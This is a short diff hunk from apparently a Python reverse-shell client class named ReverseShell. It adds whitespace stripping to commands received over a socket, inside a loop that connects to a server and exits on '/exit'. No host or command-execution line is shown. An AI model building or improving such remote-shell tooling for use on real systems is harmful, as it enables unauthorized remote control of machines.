@@ -24,7 +24,7 @@ class ReverseShell():
         self.connect2server()
         while True:
             try:
-                cmd = self.socket.recv(1024).decode()
+                cmd = self.socket.recv(1024).decode().strip()
                 if cmd == '/exit':
                     self.socket.close()
                     return
